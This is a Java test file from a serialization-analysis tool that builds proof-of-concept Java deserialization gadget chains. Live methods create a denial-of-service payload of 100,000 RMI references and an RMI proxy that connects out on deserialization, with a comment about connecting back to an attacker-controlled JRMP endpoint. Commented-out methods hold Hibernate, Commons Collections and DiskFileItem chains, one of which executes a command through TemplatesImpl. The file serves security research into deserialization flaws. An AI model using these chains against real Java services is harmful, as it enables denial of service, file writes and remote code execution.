/**
 * © 2015 AgNO3 Gmbh & Co. KG
 * All right reserved.
 * 
 * Created: 16.11.2015 by mbechler
 */
package eu.agno3.tools.serianalyzer.tests;


import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;


/**
 * @author mbechler
 *
 */
@SuppressWarnings ( "nls" )
public class Tests {

    // A - create an insane amount of system threads
    static void testDOSREFs () throws ClassNotFoundException, IOException, InterruptedException {
        ObjID id = new ObjID(1234);
        List<Object> refs = new ArrayList<>();
        for ( int i = 0; i < 100000; i++ ) {
            TCPEndpoint te = new TCPEndpoint("127.0.0.1", i);
            refs.add(new UnicastRef(new LiveRef(id, te, false)));
        }

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(refs);

        System.out.println(bos.size());
        // one thread per endpoint
        try ( ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())) ) {
            ois.readObject();
        }

        Thread.sleep(10000);
    }


    // B - connect to the given TCP endpoint,

    static void testProxyREF () throws IOException {
        ObjID id = new ObjID(0);
        TCPEndpoint te = new TCPEndpoint("127.0.0.1", 12344);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(Tests.class.getClassLoader(), new Class[] {
            Remote.class, Registry.class, Map.class
        }, obj);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(proxy);

        try ( ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())) ) {
            // if one had a method hash collision for bind/rebind and
            // a method callable from a readObject
            // or one has another gadget that gives the invoke
            // this could be even more fun:
            // connect over multiple hops or connect back to a attacker controlled JMRP
            ois.readObject();

        }
        catch ( Throwable e ) {
            e.printStackTrace();
        }

    }


    // @SuppressWarnings ( "nls" )
    // static void testFileupload () throws NoSuchFieldException, SecurityException, IOException,
    // IllegalArgumentException, IllegalAccessException {
    //
    // File repository = new File("/tmp");
    // DiskFileItem diskFileItem = new DiskFileItem("test", "application/octet-stream", false, "test", 100000,
    // repository);
    //
    // File outputFile = new File("/tmp/test");
    // // if thresh < written length, delete outputFile after copying to repository temp file
    // // otherwise write the contents to repository temp file
    // int thresh = 0;
    //
    // DeferredFileOutputStream dfos = new DeferredFileOutputStream(thresh, outputFile);
    //
    // dfos.write(new byte[] {
    // (byte) 0xAA, (byte) 0xBB, (byte) 0xCC, (byte) 0xDD, (byte) 0xEE, (byte) 0xFF
    // });
    //
    // Field fOutF = diskFileItem.getClass().getDeclaredField("dfos");
    // fOutF.setAccessible(true);
    // fOutF.set(diskFileItem, dfos);
    //
    // Field fThrshF = diskFileItem.getClass().getDeclaredField("sizeThreshold");
    // fThrshF.setAccessible(true);
    // fThrshF.set(diskFileItem, 0);
    //
    // ByteArrayOutputStream bos = new ByteArrayOutputStream();
    // ObjectOutputStream oos = new ObjectOutputStream(bos);
    // oos.writeObject(diskFileItem);
    //
    // try ( ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())) ) {
    //
    // ois.readObject();
    //
    // }
    // catch ( Throwable e ) {
    // e.printStackTrace();
    // }
    //
    // }

    // /**
    // * @author mbechler
    // *
    // */
    // private static final class ComponentExtension extends Component {
    //
    // /**
    // * @param metadata
    // * @param owner
    // */
    // private ComponentExtension ( MetadataImplementor metadata, PersistentClass owner ) throws MappingException {
    // super(metadata, owner);
    // }
    //
    //
    // /**
    // * {@inheritDoc}
    // *
    // * @see org.hibernate.mapping.Component#getComponentClass()
    // */
    // @Override
    // public Class getComponentClass () throws MappingException {
    // return TestClass2.class;
    // }
    //
    //
    // private void readObject ( ObjectInputStream ois ) throws IOException {
    // throw new IOException("Not deserialized");
    // }
    //
    // }
    //
    // static void testHibernate () throws Exception {
    //
    //        TemplatesImpl tpl = Gadgets.createTemplatesImpl("/usr/bin/gcalctool"); //$NON-NLS-1$
    //
    // GetterMethodImpl g = new GetterMethodImpl(TemplatesImpl.class, "test",
    // TemplatesImpl.class.getMethod("newTransformer"));
    //
    // Getter[] getters = new Getter[] {
    // g
    // };
    //
    // // these are just for making the constructors happy
    // MetadataImplementor impl = null;
    // MetadataBuildingContext ctx = null;
    // MetadataBuildingOptions opt = new MetadataBuilderImpl.MetadataBuildingOptionsImpl( ( new
    // StandardServiceRegistryBuilder() ).build());
    // ComponentExtension component = new ComponentExtension(impl, new RootClass(ctx));
    //
    // PojoComponentTuplizer tup = new PojoComponentTuplizer(component);
    //
    //        Field gF = AbstractComponentTuplizer.class.getDeclaredField("getters"); //$NON-NLS-1$
    // gF.setAccessible(true);
    // gF.set(tup, getters);
    //
    // ComponentType t = new ComponentType(null, new ComponentMetamodel(component, opt));
    //
    //        Field tupF = t.getClass().getDeclaredField("componentTuplizer"); //$NON-NLS-1$
    // tupF.setAccessible(true);
    // tupF.set(t, tup);
    //
    //        Field spanF = t.getClass().getDeclaredField("propertySpan"); //$NON-NLS-1$
    // spanF.setAccessible(true);
    // spanF.set(t, 1);
    //
    //        Field typeF = t.getClass().getDeclaredField("propertyTypes"); //$NON-NLS-1$
    // typeF.setAccessible(true);
    // typeF.set(t, new Type[] {
    // t
    // });
    //
    // TypedValue v1 = new TypedValue(t, null);
    // TypedValue v2 = new TypedValue(t, null);
    //
    //        Field vF = v1.getClass().getDeclaredField("value"); //$NON-NLS-1$
    // vF.setAccessible(true);
    // vF.set(v1, tpl);
    // vF.set(v2, tpl);
    //
    //        Field tF = v1.getClass().getDeclaredField("type"); //$NON-NLS-1$
    // tF.setAccessible(true);
    // tF.set(v1, t);
    // tF.set(v2, t);
    //
    // ConcurrentHashMap s = new ConcurrentHashMap<>();
    // s.put(v1, v1);
    // s.put(v2, v2);
    //
    // ByteArrayOutputStream bos = new ByteArrayOutputStream();
    // ObjectOutputStream oos = new ObjectOutputStream(bos);
    // oos.writeObject(s);
    //
    // try ( ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())) ) {
    // System.out.println("New deserializing");
    // // if one had a method hash collision for method callable from a deserialization this could be even more fun
    // Object o = ois.readObject();
    //
    // }
    // catch ( Throwable e ) {
    // e.printStackTrace();
    // }
    // }

    // @SuppressWarnings ( {
    // "rawtypes", "unchecked"
    // } )
    // static void testCommons () throws IOException, NoSuchFieldException, SecurityException, IllegalArgumentException,
    // IllegalAccessException {
    //
    // InstantiateTransformer<Object> instantiateTransformer = new InstantiateTransformer<>(new Class[] {
    // String.class
    // }, new Object[] {
    //            "bad" //$NON-NLS-1$
    // });
    //
    // Transformer transformerChain1 = new ChainedTransformer(new Transformer[] {
    // new ConstantTransformer(1)
    // });
    //
    // Transformer transformerChain2 = new ChainedTransformer(new Transformer[] {
    // new ConstantTransformer(1)
    // });
    //
    // final Transformer[] transformers1 = new Transformer[] {
    // new ConstantTransformer(TestClass.class), instantiateTransformer
    // };
    //
    // final Transformer[] transformers2 = new Transformer[] {
    // new FactoryTransformer<>(PrototypeFactory.prototypeFactory(new TestClass2()))
    // };
    //
    // Map hashMap = new HashMap<>();
    // LazyMap lazyMap1 = LazyMap.lazyMap(hashMap, transformerChain1);
    // LazyMap lazyMap2 = LazyMap.lazyMap(hashMap, transformerChain2);
    //
    //        Field declaredField = transformerChain1.getClass().getDeclaredField("iTransformers"); //$NON-NLS-1$
    // declaredField.setAccessible(true);
    // declaredField.set(transformerChain1, transformers1);
    //
    //        declaredField = transformerChain1.getClass().getDeclaredField("iTransformers"); //$NON-NLS-1$
    // declaredField.setAccessible(true);
    // declaredField.set(transformerChain2, transformers2);
    //
    // ByteArrayOutputStream bos = new ByteArrayOutputStream();
    // ObjectOutputStream oos = new ObjectOutputStream(bos);
    // oos.writeObject(lazyMap1);
    // oos.reset();
    // oos.writeObject(lazyMap2);
    //
    // try ( ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())) ) {
    //
    // Map m = (Map) ois.readObject();
    //            m.get("test"); //$NON-NLS-1$
    //
    // m = (Map) ois.readObject();
    //            m.get("test"); //$NON-NLS-1$
    // }
    // catch ( Throwable e ) {
    // e.printStackTrace();
    // }
    //
    // }

    /**
     * @param args
     */
    public static void main ( String[] args ) {

        try {

            // testDOSREFs();
            // testProxyREF();
            // testCommons();

            // testHibernate();

            // testFileupload();

        }
        catch ( Throwable e ) {
            e.printStackTrace();
        }
    }

}
